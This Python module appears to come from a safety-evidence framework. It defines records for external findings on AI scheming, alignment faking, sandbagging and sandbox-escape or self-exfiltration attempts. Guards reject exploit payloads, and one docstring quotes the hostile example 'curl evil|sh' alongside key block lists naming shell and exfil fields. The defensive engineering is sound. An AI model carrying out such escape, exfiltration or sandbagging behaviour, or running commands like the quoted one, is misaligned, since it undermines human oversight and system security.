# Copyright 2024 NovaFabric Contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Alignment-risk signals — ADR-0167 D3/P3 (NF-354, NF-355, NF-356, NF-358).

Four record-only evidence objects for the ``facets.frontier_safety`` block,
each an **external** evaluator's finding held by reference:

- :class:`DeceptionSignal` (NF-354) — an external scheming / deception /
  eval-awareness detector produced a signal. ``verdict_source`` is fixed to
  ``scheming_eval`` and ``verdict_ref`` is required.
- :class:`SandbaggingRecord` (NF-355) — the elicitation regime a capability
  was measured under, the producer's *declared* ceiling (by digest), and the
  external evaluator's ``observed_vs_declared`` comparison.
- :class:`AutonomyAttempt` (NF-356) — a sandbox-escape / self-exfiltration /
  autonomous-replication attempt, as **counts plus a report digest only**.
- :class:`ElicitationRecord` (NF-358) — how hard the model was pushed during
  deployment, as reported, with a ``no_ceiling_computed: true`` marker.

What this module does **not** do is the point of it (ADR-0167 I-1, I-3, I-4):

- It runs no scheming detector, no sandbox-escape test and no capability
  elicitation. It computes no capability ceiling and no comparison against
  one; ``observed_vs_declared`` and ``outcome`` are *quoted* from the external
  report behind ``verdict_ref`` / ``report_ref``.
- It never blocks, pauses or gates the workload. A ``succeeded`` sandbox
  escape recorded here is a sentence about what an evaluator reported.
- It never holds the payload (I-5). Exploit steps, exfiltrated data, shell
  commands, transcripts and prompts are rejected on the ``extra="allow"``
  surface — :data:`AUTONOMY_PAYLOAD_MARKERS` on top of the shared
  :data:`~novafabric.frontier_safety._common.PAYLOAD_KEY_MARKERS` guard — and
  a NovaFabric-computed ceiling is rejected on the objects where one could be
  smuggled in (:data:`COMPUTED_CEILING_MARKERS`). Keys are normalised
  (lower-cased, non-alphanumerics stripped) and matched by *substring*, so
  ``exploitSteps`` / ``exploit-steps`` / ``ceilingValue`` do not evade it.
- Every free-form string it holds is bounded
  (:data:`~novafabric.frontier_safety._common.MAX_FREE_STRING_LENGTH`), and an
  :class:`AutonomyAttempt` accepts string extras only in identifier shape —
  no whitespace, no shell metacharacters — so a benignly named ``notes`` field
  cannot carry ``curl evil|sh``.

Extra fields stay open (``extra="allow"``): ADR-0167 makes every field additive
and optional, and existing producers attach evaluator ids / window labels. The
marker guard plus the value bounds is the chosen trade-off over a closed
allow-list; it is documented in ADR-0167's Implementation status.
"""

from __future__ import annotations

import re
from typing import Any, Literal

from pydantic import (
    ConfigDict,
    Field,
    StrictInt,
    ValidationInfo,
    field_validator,
    model_validator,
)

from novafabric.frontier_safety._common import (
    _DIGEST_RE,
    SCHEMA_VERSION,
    ComputedVerdictError,
    FrontierSafetyError,
    PayloadCaptureError,
    _ExternalVerdict,
    _iter_strings,
    _validate_digest,
    check_extra_fields,
    check_string_lengths,
    find_marker_keys,
)

__all__ = [
    "AUTONOMY_PAYLOAD_KEYS",
    "AUTONOMY_PAYLOAD_MARKERS",
    "COMPUTED_CEILING_KEYS",
    "COMPUTED_CEILING_MARKERS",
    "MAX_ATTEMPT_COUNT",
    "AttemptOutcome",
    "AttemptType",
    "AutonomyAttempt",
    "DeceptionSignal",
    "ElicitationEffort",
    "ElicitationRecord",
    "ElicitationRegime",
    "ObservedVsDeclared",
    "SandbaggingRecord",
    "SignalType",
    "total_attempts",
]

#: NF-354 signal families (spec §3 item 7). ``other`` keeps a novel external
#: detector's finding on the record rather than dropping the evidence.
SignalType = Literal[
    "in_context_scheming",
    "alignment_faking",
    "eval_awareness",
    "strategic_deception",
    "reward_hacking",
    "other",
]

#: NF-355 elicitation regime the capability measurement was taken under.
ElicitationRegime = Literal["typical", "best_effort", "fine_tuned", "adversarial"]

#: NF-355 external comparison of observed against declared capability.
#: ``unknown`` is the honest value when the evaluator reached no conclusion.
ObservedVsDeclared = Literal["consistent", "underperformed", "unknown"]

#: NF-356 attempt families (spec §3 item 9).
AttemptType = Literal[
    "sandbox_escape",
    "self_exfiltration",
    "autonomous_replication",
    "weight_exfiltration",
    "undermining_safeguards",
]

#: NF-356 outcome *as reported by the external evaluator*.
AttemptOutcome = Literal["succeeded", "failed", "partial", "detected"]

#: NF-358 how hard the model was pushed during deployment.
ElicitationEffort = Literal["typical", "scaffolded", "tool_augmented", "best_effort"]

#: Upper bound on a recorded attempt count. A count is evidence, not a
#: counter NovaFabric maintains; anything larger is a producer bug (or an
#: attempt to push an unbounded integer through a sealed record).
MAX_ATTEMPT_COUNT = 1_000_000

#: Known key spellings that carry the *substance* of an autonomy attempt —
#: what was run, what left the sandbox. Documented examples; the guard matches
#: the broader :data:`AUTONOMY_PAYLOAD_MARKERS` on normalised keys.
AUTONOMY_PAYLOAD_KEYS: frozenset[str] = frozenset(
    {
        "steps",
        "attack_steps",
        "commands",
        "shell_commands",
        "exploit_code",
        "exploit_script",
        "exfiltrated_data",
        "exfiltrated_bytes",
        "replication_payload",
    }
)

#: Substring markers rejected on :class:`AutonomyAttempt` extras (normalised
#: keys) in addition to the shared payload markers. Kept local rather than
#: added to ``_common.PAYLOAD_KEY_MARKERS``: ``command`` or ``step`` are
#: harmless on a P2 control decision, and widening the shared set would
#: retroactively reject valid P2 material. Free-text channels (``notes``,
#: ``details``, ``output``) are included because NF-356 is counts plus a
#: report digest *only* — narrative belongs in the report behind ``report_ref``.
AUTONOMY_PAYLOAD_MARKERS: tuple[str, ...] = (
    "step",
    "command",
    "cmd",
    "shell",
    "script",
    "sourcecode",
    "exfil",
    "stdout",
    "stderr",
    "output",
    "note",
    "comment",
    "detail",
    "narrative",
    "trace",
    "argv",
)

#: String extras on an :class:`AutonomyAttempt` must look like an identifier
#: (an evaluator id, a window label, a version) or be a ``sha256:`` digest.
#: Whitespace and shell metacharacters (``| ; & $ ` > <``) are refused: that is
#: the shape of a command line, not of a label.
_AUTONOMY_IDENTIFIER_RE = re.compile(r"^[A-Za-z0-9._:/@+=\-]{1,128}$")

#: Known key spellings that would carry a capability ceiling NovaFabric
#: computed. The *declared* ceiling is held only by digest
#: (``declared_ceiling_ref``); an inline ceiling value would be NovaFabric
#: asserting one (spec items 8/11). Documented examples; the guard matches the
#: broader :data:`COMPUTED_CEILING_MARKERS` on normalised keys.
COMPUTED_CEILING_KEYS: frozenset[str] = frozenset(
    {
        "ceiling",
        "computed_ceiling",
        "capability_ceiling",
        "estimated_ceiling",
        "ceiling_value",
        "ceiling_score",
    }
)

#: Substring markers for an inlined ceiling / capability estimate, matched on
#: normalised keys of :class:`SandbaggingRecord` and :class:`ElicitationRecord`
#: extras (``ceilingValue``, ``ceiling_estimate``, ``max_capability``,
#: ``capability_score``…). ``score`` is included: a numeric capability score
#: is an eval result, which the capsule never holds (I-5) and which would read
#: as a NovaFabric-computed ceiling once sealed (I-4). A digest-valued
#: reference key (``*_ref`` / ``*_digest``) is exempt — it points at a report.
COMPUTED_CEILING_MARKERS: tuple[str, ...] = (
    "ceiling",
    "maxcapab",
    "capabilityestimate",
    "capabilityscore",
    "capabilitylevel",
    "estimatedcapab",
    "elicitedcapab",
    "score",
)


# ── Shared guards ─────────────────────────────────────────────────────────


def _reject_keys(
    extra: dict[str, Any] | None,
    markers: tuple[str, ...],
    *,
    owner: str,
    error: type[FrontierSafetyError],
    reason: str,
) -> None:
    """Raise ``error`` when any nested extra key contains one of ``markers``.

    Keys are normalised and matched by substring
    (:func:`~novafabric.frontier_safety._common.find_marker_keys`), with the
    same bounded walk as the shared guard, so nesting a forbidden key one
    level down does not evade it and an over-deep structure is rejected as a
    payload.
    """
    hits = find_marker_keys(extra, markers)
    if hits:
        raise error(f"{owner} carries field(s) {hits}; {reason}")


def _shared_extra_guard(record: _ExternalVerdict) -> None:
    """Apply the shared I-5 / C4 extra-field guard and the string-length cap.

    The cap covers every free-form string the object holds: all extra fields
    (keys and values, at any bounded depth), ``schema_version`` and a
    string-valued ``verdict``. Declared reference fields are bounded by their
    own validators.
    """
    owner = type(record).__name__
    check_extra_fields(record.model_extra, owner=owner)
    check_string_lengths(
        {
            "schema_version": getattr(record, "schema_version", None),
            "verdict": record.verdict,
            **(record.model_extra or {}),
        },
        owner=owner,
    )


def _reject_free_text_values(record: _ExternalVerdict) -> None:
    """Reject non-identifier string values in an autonomy attempt's extras.

    NF-356 is counts plus a report digest only; a string extra is allowed as
    a label (identifier-shaped) or a ``sha256:`` digest, never as prose or a
    command line. The message names the key, never the value.
    """
    extra = record.model_extra
    if not extra:
        return
    for field, value in extra.items():
        for item in _iter_strings({field: value}):
            if _DIGEST_RE.match(item) or _AUTONOMY_IDENTIFIER_RE.match(item):
                continue
            raise PayloadCaptureError(
                f"{type(record).__name__} extra field {field!r} holds free "
                "text; an autonomy attempt carries identifier-shaped labels "
                "or sha256 digests only — narrative, commands and output "
                "belong in the report behind report_ref (ADR-0167 D3, I-5)"
            )


def _reject_computed_ceiling(record: _ExternalVerdict) -> None:
    """Reject an inlined ceiling value NovaFabric would be asserting (I-4)."""
    _reject_keys(
        record.model_extra,
        COMPUTED_CEILING_MARKERS,
        owner=type(record).__name__,
        error=ComputedVerdictError,
        reason=(
            "NovaFabric never computes a capability ceiling — hold the "
            "producer's declared ceiling by digest in declared_ceiling_ref "
            "(ADR-0167 D3, I-4)"
        ),
    )


# ── Objects ───────────────────────────────────────────────────────────────


class DeceptionSignal(_ExternalVerdict):
    """An external scheming / deception / eval-awareness signal (NF-354).

    Records *that* an external detector (an Apollo-style in-context-scheming
    eval, an alignment-faking probe, …) produced a signal of ``signal_type``,
    pointing at the detector (``detector_ref``), the evidence it looked at
    (``evidence_digest``) and its verdict document (``verdict_ref``). It never
    asserts that the model *is* scheming: that claim, if made at all, lives
    behind ``verdict_ref`` and belongs to the ``scheming_eval`` that made it.
    """

    model_config = ConfigDict(extra="allow")

    schema_version: str = SCHEMA_VERSION
    signal_type: SignalType
    #: Digest of the external detector / eval identity that produced the signal.
    detector_ref: str
    #: Digest of the evidence the detector examined — never the evidence itself.
    evidence_digest: str
    #: Fixed: an NF-354 signal's only permissible source is the scheming eval.
    verdict_source: Literal["scheming_eval"] = "scheming_eval"
    #: Required: the signal *is* the external detector's output.
    verdict_ref: str

    @field_validator("detector_ref", "evidence_digest", mode="before")
    @classmethod
    def _check_digests(cls, v: object, info: ValidationInfo) -> str:
        return _validate_digest(v, field=str(info.field_name))

    @model_validator(mode="after")
    def _check_shape(self) -> DeceptionSignal:
        _shared_extra_guard(self)
        return self


class SandbaggingRecord(_ExternalVerdict):
    """Sandbagging / under-elicitation evidence (NF-355).

    Records the ``elicitation_regime`` a capability was measured under, the
    producer's *declared* ceiling by digest, and the external evaluator's
    ``observed_vs_declared`` comparison. NovaFabric computes neither the
    ceiling nor the comparison: a concluded comparison (anything other than
    ``unknown``) must name its ``verdict_source``, or it would read — once
    sealed — as NovaFabric's own finding that a model sandbagged.
    """

    model_config = ConfigDict(extra="allow")

    schema_version: str = SCHEMA_VERSION
    elicitation_regime: ElicitationRegime
    #: Digest of the producer/evaluator's declared capability ceiling.
    declared_ceiling_ref: str
    #: Quoted from the external evaluator; never computed here.
    observed_vs_declared: ObservedVsDeclared
    #: Required: the comparison is only recordable with a pointer to it.
    verdict_ref: str

    @field_validator("declared_ceiling_ref", mode="before")
    @classmethod
    def _check_ceiling_ref(cls, v: object) -> str:
        return _validate_digest(v, field="declared_ceiling_ref")

    @model_validator(mode="after")
    def _check_shape(self) -> SandbaggingRecord:
        if self.observed_vs_declared != "unknown" and self.verdict_source is None:
            raise ComputedVerdictError(
                f"SandbaggingRecord carries observed_vs_declared="
                f"{self.observed_vs_declared!r} with no verdict_source; an "
                "unattributed comparison is indistinguishable from a NovaFabric "
                "judgement once sealed (ADR-0167 D3/D4)"
            )
        _shared_extra_guard(self)
        _reject_computed_ceiling(self)
        return self


class AutonomyAttempt(_ExternalVerdict):
    """A sandbox-escape / self-exfiltration / replication attempt (NF-356).

    Counts plus a report digest — nothing else. ``outcome`` is quoted from the
    external evaluator's report (``report_ref``). The exploit payload, the
    steps, the commands and anything exfiltrated are **prohibited** (I-5) and
    rejected if they arrive on the extra-field surface.
    """

    model_config = ConfigDict(extra="allow")

    schema_version: str = SCHEMA_VERSION
    attempt_type: AttemptType
    #: As reported by the external evaluator.
    outcome: AttemptOutcome
    #: Digest of the evaluator's report. A digest, not a URI: the report the
    #: count came from must not be re-pointable after sealing.
    report_ref: str
    #: How many attempts the report counts. Strict int (``True`` is not ``1``)
    #: and at least one: zero attempts is recorded by there being no object
    #: (I-2), never by an object claiming a negative.
    attempt_count: StrictInt = Field(ge=1, le=MAX_ATTEMPT_COUNT)
    #: Required: the outcome is only recordable with a pointer to its source.
    verdict_ref: str

    @field_validator("report_ref", mode="before")
    @classmethod
    def _check_report_ref(cls, v: object) -> str:
        return _validate_digest(v, field="report_ref")

    @model_validator(mode="after")
    def _check_shape(self) -> AutonomyAttempt:
        _shared_extra_guard(self)
        _reject_keys(
            self.model_extra,
            AUTONOMY_PAYLOAD_MARKERS,
            owner=type(self).__name__,
            error=PayloadCaptureError,
            reason=(
                "an autonomy attempt records attempt_count + report_ref only; "
                "exploit steps, commands and exfiltrated data never enter the "
                "capsule (ADR-0167 D3, I-5)"
            ),
        )
        _reject_free_text_values(self)
        return self


class ElicitationRecord(_ExternalVerdict):
    """How hard a model was pushed during deployment, as reported (NF-358).

    ``no_ceiling_computed`` is ``Literal[True]``: the object's meaning is
    "NovaFabric recorded the reported effort and computed no ceiling". A
    ``false`` value — an object claiming NovaFabric *did* compute one — is
    unrepresentable, and an inlined ceiling value is rejected.
    """

    model_config = ConfigDict(extra="allow")

    schema_version: str = SCHEMA_VERSION
    elicitation_effort: ElicitationEffort
    #: Digest of the external elicitation report.
    elicitation_ref: str
    no_ceiling_computed: Literal[True] = True

    @field_validator("elicitation_ref", mode="before")
    @classmethod
    def _check_elicitation_ref(cls, v: object) -> str:
        return _validate_digest(v, field="elicitation_ref")

    @model_validator(mode="after")
    def _check_shape(self) -> ElicitationRecord:
        _shared_extra_guard(self)
        _reject_computed_ceiling(self)
        return self


# ── Read helpers (pure, no judgement) ─────────────────────────────────────


def total_attempts(attempts: tuple[AutonomyAttempt, ...] | list[AutonomyAttempt]) -> int:
    """Sum of the reported ``attempt_count`` values.

    Arithmetic over reported counts only — not a risk score, and a zero means
    *nothing was recorded*, never *the model is safe* (I-4).
    """
    return sum(a.attempt_count for a in attempts)
